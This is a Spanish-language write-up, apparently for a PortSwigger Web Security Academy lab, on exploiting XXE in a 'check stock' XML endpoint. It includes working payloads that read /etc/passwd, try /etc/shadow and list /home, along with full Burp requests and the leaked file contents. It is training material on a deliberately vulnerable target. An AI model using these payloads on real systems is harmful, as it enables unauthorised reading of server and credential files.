# 👿 Laboratorio: Explotación de XXE utilizando entidades externas para recuperar archivos

sta práctica de laboratorio tiene una función "Verificar stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

Para resolver la práctica de laboratorio, inyecte una entidad externa XML para recuperar el contenido del /etc/passwdarchivo.



RESOLUCIÓN:

LOGRAMOS CREAR NUESTRA ENTIDAD ]> DENTRO DE LA CONSULTA QUE VIAJA POR XML AL SERVIDOR ; PARA CARGAR EN EL EL METODO DE PROTOCOLO FILE:// Y SOLICITAR EL CONTENIDO DEL /ETC/PASSWD, LLAMANDO A NUESTRA ENTIDAD EN PRODUCTID \&P4IM0Nxxe; PARA QUE SE EJECUTE Y NOS LO DEVUELVA LA INFO, Y SE TENZO.

```python
// pyth

------------------



SCRIPT XML:



<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>



----

SCRIPT XML PAYLOAD YA PERSONALIZADO:


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&P4IM0Nxxe;</productId><storeId>
1
</storeId></stockCheck>








CONCLUSION:

LOGRAMOS CREAR NUESTRA ENTIDAD    <!DOCTYPE foo [ <!ENTITY P4IM0Nxxe SYSTEM "file:///etc/passwd"> ]>     DENTRO DE LA CONSULTA QUE VIAJA POR XML AL SERVIDOR ; PARA CARGAR EN EL EL METODO DE PROTOCOLO FILE:// Y SOLICITAR EL CONTENIDO DEL /ETC/PASSWD, LLAMANDO A NUESTRA ENTIDAD EN PRODUCTID     <productId>&P4IM0Nxxe;</productId>  PARA QUE SE EJECUTE Y NOS LO DEVUELVA LA INFO, Y SE TENZO.


-------------


BURPSUITE:





REQUEST NORMAL:



POST /product/stock HTTP/2
Host: 0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Cookie: session=mum8nALw5AnDczIucBXm196hsBq1gSOS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>



RESPONSE NORMAL:



HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

257



-----





REQUEST CON PAYLOAD:


POST /product/stock HTTP/2
Host: 0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Cookie: session=mum8nALw5AnDczIucBXm196hsBq1gSOS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 193
Origin: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&P4IM0Nxxe;</productId><storeId>
1
</storeId></stockCheck>




RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2338

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
"



-------





REQUEST CON PAYLOAD:



POST /product/stock HTTP/2
Host: 0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Cookie: session=mum8nALw5AnDczIucBXm196hsBq1gSOS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 193
Origin: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe SYSTEM "file:///etc/shadow"> ]>
<stockCheck>
<productId>&P4IM0Nxxe;</productId><storeId>
1
</storeId></stockCheck>





RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 94

"XML parser exited with error: java.io.FileNotFoundException: /etc/shadow (Permission denied)"




------



REQUEST CON PAYLOAD:



POST /product/stock HTTP/2
Host: 0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Cookie: session=mum8nALw5AnDczIucBXm196hsBq1gSOS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 188
Origin: https://0a84006d0490d84b81c98e8600d80001.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe SYSTEM "file:///home/"> ]>
<stockCheck>
<productId>&P4IM0Nxxe;</productId><storeId>
1
</storeId></stockCheck>






RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 54

"Invalid product ID: carlos
elmer
install
peter
user
"
```

